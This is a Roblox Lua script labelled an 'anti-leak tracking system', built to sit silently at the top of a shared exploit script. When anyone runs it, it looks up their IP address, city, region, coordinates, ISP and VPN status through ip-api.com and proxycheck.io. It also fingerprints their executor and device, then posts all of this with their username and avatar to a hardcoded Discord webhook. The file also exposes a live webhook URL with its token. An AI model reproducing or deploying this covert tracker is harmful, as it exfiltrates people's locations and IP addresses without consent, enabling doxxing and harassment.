-- ============================================
-- ANTI-LEAK TRACKING SYSTEM v2.0
-- Auto-identifies script execution
-- ============================================

local Player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera
local MarketplaceService = game:GetService("MarketplaceService")

-- WEBHOOK URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1472640186616647838/LDFNMg2TCfgxqV1L3KhhWG2kLb4vsEqXutnmh23sWMgKVqG1zZJ9GuVRmJbvEH2hceVp"

-- Owner mention
local OWNER_MENTION = "<@1317131074618396676>"

-- Profile URL
local PROFILE_URL = "https://www.roblox.com/users/" .. tostring(Player.UserId) .. "/profile"

-- ISP BLACKLIST - Users whose ISP won't be shown
local ISP_BLACKLISTED_USERS = {
    "AGKxTFFxFTA_Chosen"  -- Add more usernames here
}

-- Check if user is ISP blacklisted
local function IsISPBlacklisted()
    for _, username in ipairs(ISP_BLACKLISTED_USERS) do
        if Player.Name:lower() == username:lower() then
            return true
        end
    end
    return false
end

-- Enhanced executor detection (PC + Mobile)
local function GetExecutor()
    if identifyexecutor then
        local ok, name, version = pcall(identifyexecutor)
        if ok and name then
            return name .. (version and (" v" .. tostring(version)) or "")
        end
    end
    if getexecutorname then
        local ok, name = pcall(getexecutorname)
        if ok and name then return name end
    end

    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if SENTINEL_LOADED or issentinelclosure then return "Sentinel" end
    if is_sirhurt_closure then return "SirHurt" end
    if Fluxus then return "Fluxus" end
    if ScriptWare then return "Script-Ware" end
    if DrawingLib or draw_circle then return "JJSploit" end

    if getgenv then
        local ok, env = pcall(getgenv)
        if ok and env then
            if env.SOLARA_LOADED then return "Solara" end
            if env.OXYGEN_LOADED then return "Oxygen U" end
            if env.CELERY_LOADED then return "Celery" end
            if env.AWP_LOADED then return "AWP" end
            if env.PROTO_LOADED then return "Proto" end
            if env.VEGA_LOADED then return "Vega X" end
            if env.COCO_Z then return "Coco Z" end
            if env.CALAMARI_LOADED then return "Calamari" end
            if env.EVON_LOADED then return "Evon" end
            if env.VELOCITY_LOADED then return "Velocity" end
            if env.TRIGON_LOADED then return "Trigon Evo" end
            if env.VALYSE_LOADED then return "Valyse" end
            if env.CRYPTIC_LOADED then return "Cryptic" end
            if env.ZORARA_LOADED then return "Zorara" end
            if env.WAVE_LOADED then return "Wave" end
            if env.SW_LOADED then return "Sirus" end
            if env.RONIX_LOADED then return "Ronix" end
            if env.XENO_LOADED then return "Xeno" end
            if env.PHANTOM_LOADED then return "Phantom X" end
            if env.SELIWARE_LOADED then return "Seliware" end
            if env.CODEX_LOADED then return "Codex" end
            if env.HACKRON_LOADED then return "Hackron" end
            if env.FLUXUS_ANDROID then return "Fluxus Android" end
            if env.EVON_MOBILE then return "Evon Mobile" end
            if env.VEGAX_MOBILE then return "Vega X Mobile" end
            if env.DELTA_LOADED then return "Delta" end
            if env.HYDROGEN_LOADED then return "Hydrogen" end
            if env.ARCEUS_LOADED then return "Arceus X" end
            if env.ELECTRON_LOADED then return "Electron" end
            if env.VENUS_LOADED then return "Venus Mobile" end
            if env.TRIGON_ANDROID then return "Trigon Android" end
            if env.DELTA_ANDROID then return "Delta Android" end
            if env.TUBLEX_LOADED then return "Tublex" end
            if env.XHUB_LOADED then return "X-Hub" end
            if env.RANDOMHUB_LOADED then return "RandomHub" end
            if env.NOWGG_LOADED then return "Now.gg Executor" end
            if env.EXECUTOR_LOADED and env.EXECUTOR_NAME then return env.EXECUTOR_NAME end
        end
    end

    if ARCEUS_X or ARCEUSX then return "Arceus X" end
    if delta then return "Delta" end
    if electron then return "Electron" end
    if hydrogen then return "Hydrogen" end
    if CODEX then return "Codex" end
    if SELIWARE then return "Seliware" end
    if KRNL_ANDROID then return "KRNL Android" end
    if FLUXUS_ANDROID then return "Fluxus Android" end
    if VENUS_LOADED then return "Venus Mobile" end
    if TUBLEX then return "Tublex" end
    if XHUB then return "X-Hub" end
    if RANDOMHUB then return "RandomHub" end
    if getgenv and getgenv().solara then return "Solara" end

    if checkcaller and hookfunction and newcclosure then
        return "Unknown (Advanced Executor)"
    elseif checkcaller then
        return "Unknown (Mid Executor)"
    elseif hookfunction then
        return "Unknown (Basic Executor)"
    end

    return "Unknown Executor"
end

-- Function to detect device type
local function GetDeviceType()
    local touchEnabled = UserInputService.TouchEnabled
    local mouseEnabled = UserInputService.MouseEnabled
    local keyboardEnabled = UserInputService.KeyboardEnabled
    local gamepadEnabled = UserInputService.GamepadEnabled

    local screenSize = Camera.ViewportSize
    local diagonal = math.sqrt(screenSize.X^2 + screenSize.Y^2)

    if gamepadEnabled and not keyboardEnabled and not mouseEnabled then
        return "Console"
    elseif touchEnabled and not keyboardEnabled and not mouseEnabled then
        return diagonal < 1000 and "Mobile Phone" or "Tablet"
    elseif keyboardEnabled and mouseEnabled then
        return "Computer"
    elseif touchEnabled and keyboardEnabled then
        return "Laptop/2-in-1"
    else
        return "Unknown Device"
    end
end

-- Function to get location, IP, VPN, ISP
local function GetLocationAndIP()
    local success, result = pcall(function()
        local response = request({
            Url = "http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,proxy,hosting,query,isp",
            Method = "GET"
        })
        if response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            if data.status == "success" then
                local isVPN = data.proxy or data.hosting or false
                return {
                    ip = data.query or "Unknown IP",
                    fullLocation = (data.city or "?") .. ", " .. (data.country or "?"),
                    region = data.regionName or "Unknown",
                    lat = data.lat or 0,
                    lon = data.lon or 0,
                    isp = data.isp or "Unknown ISP",
                    isVPN = isVPN,
                    vpnStatus = isVPN and "⚠️ VPN/Proxy Detected" or "✅ No VPN Detected"
                }
            end
        end
    end)

    if success and result then
        if result.isVPN then
            local bypassSuccess, bypassData = pcall(function()
                local response = request({
                    Url = "https://proxycheck.io/v2/" .. result.ip .. "?vpn=1&asn=1",
                    Method = "GET"
                })
                if response.StatusCode == 200 then
                    local data = HttpService:JSONDecode(response.Body)
                    if data and data[result.ip] then
                        local ipData = data[result.ip]
                        return {
                            vpnType = ipData.type or "Unknown",
                            vpnProvider = ipData.provider or ipData.organisation or "Unknown"
                        }
                    end
                end
            end)
            if bypassSuccess and bypassData then
                result.vpnStatus = "⚠️ VPN: " .. bypassData.vpnType .. " (" .. bypassData.vpnProvider .. ")"
            end
        end
        return result
    end

    return {
        ip = "Unavailable", fullLocation = "Unavailable",
        region = "Unavailable", lat = 0, lon = 0,
        isp = "Unavailable", isVPN = false, vpnStatus = "Detection Failed"
    }
end

-- Avatar images
local function GetAvatarImages()
    local userId = tostring(Player.UserId)
    local headshot = "https://www.roblox.com/images/default_avatar.png"
    local avatar = "https://www.roblox.com/images/default_avatar.png"

    local hsSuccess, hsResult = pcall(function()
        local r = request({ Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png", Method = "GET" })
        if r.StatusCode == 200 then
            local d = HttpService:JSONDecode(r.Body)
            if d and d.data and d.data[1] then return d.data[1].imageUrl end
        end
    end)
    if hsSuccess and hsResult then headshot = hsResult end

    local avSuccess, avResult = pcall(function()
        local r = request({ Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png", Method = "GET" })
        if r.StatusCode == 200 then
            local d = HttpService:JSONDecode(r.Body)
            if d and d.data and d.data[1] then return d.data[1].imageUrl end
        end
    end)
    if avSuccess and avResult then avatar = avResult end

    return headshot, avatar
end

-- Game info
local function GetGameInfo()
    local placeId = game.PlaceId
    local gameName = "Unknown Game"
    local gameLogo = nil
    local gameCreator = "Unknown Creator"

    local infoSuccess, gameInfo = pcall(function()
        return MarketplaceService:GetProductInfo(placeId)
    end)
    if infoSuccess and gameInfo then
        gameName = gameInfo.Name or "Unknown Game"
        gameCreator = (gameInfo.Creator and gameInfo.Creator.Name) or "Unknown"
    end

    local uniSuccess, uniResult = pcall(function()
        local r = request({ Url = "https://apis.roblox.com/universes/v1/places/" .. tostring(placeId) .. "/universe", Method = "GET" })
        if r.StatusCode == 200 then
            return HttpService:JSONDecode(r.Body).universeId
        end
    end)

    if uniSuccess and uniResult then
        local logoSuccess, logoResult = pcall(function()
            local r = request({ Url = "https://thumbnails.roblox.com/v1/games/icons?universeIds=" .. tostring(uniResult) .. "&size=512x512&format=Png", Method = "GET" })
            if r.StatusCode == 200 then
                local d = HttpService:JSONDecode(r.Body)
                if d and d.data and d.data[1] then return d.data[1].imageUrl end
            end
        end)
        if logoSuccess and logoResult then gameLogo = logoResult end
    end

    return { name = gameName, creator = gameCreator, placeId = tostring(placeId), logo = gameLogo }
end

-- Main webhook sender
local function SendTrackingWebhook()
    spawn(function()
        pcall(function()
            local locationData = GetLocationAndIP()
            local deviceType = GetDeviceType()
            local headshotUrl, avatarUrl = GetAvatarImages()
            local gameInfo = GetGameInfo()
            local executor = GetExecutor()

            -- Hide ISP if user is blacklisted
            local displayISP = IsISPBlacklisted() and "Hidden (Blacklisted)" or locationData.isp

            local embed = {
                ["title"] = "Script Execution Detected",
                ["url"] = PROFILE_URL,
                ["color"] = locationData.isVPN and 16776960 or 15158332,
                ["fields"] = {
                    {
                        ["name"] = "Username",
                        ["value"] = "[" .. Player.Name .. "](" .. PROFILE_URL .. ")",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Display Name",
                        ["value"] = Player.DisplayName,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "User ID",
                        ["value"] = tostring(Player.UserId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Executor",
                        ["value"] = executor,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Device Type",
                        ["value"] = deviceType,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ISP Provider",
                        ["value"] = displayISP,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "IP Address",
                        ["value"] = "```" .. locationData.ip .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "VPN Status",
                        ["value"] = locationData.vpnStatus,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Full Location",
                        ["value"] = locationData.fullLocation,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Regional Location",
                        ["value"] = locationData.region,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Coordinates",
                        ["value"] = "Lat: " .. locationData.lat .. ", Lon: " .. locationData.lon,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "Game",
                        ["value"] = "[" .. gameInfo.name .. "](https://www.roblox.com/games/" .. gameInfo.placeId .. ")",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Game Creator",
                        ["value"] = gameInfo.creator,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Timestamp",
                        ["value"] = os.date("%Y-%m-%d at %H:%M:%S"),
                        ["inline"] = false
                    }
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
                ["thumbnail"] = { ["url"] = headshotUrl },
                ["image"] = { ["url"] = avatarUrl }
            }

            if gameInfo.logo then
                embed["author"] = {
                    ["name"] = gameInfo.name,
                    ["icon_url"] = gameInfo.logo,
                    ["url"] = "https://www.roblox.com/games/" .. gameInfo.placeId
                }
            end

            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    ["content"] = OWNER_MENTION,
                    ["embeds"] = { embed }
                })
            })
        end)
    end)
end

-- AUTO-EXECUTE
SendTrackingWebhook()

-- ============================================
-- YOUR SCRIPT CODE STARTS BELOW
-- ============================================
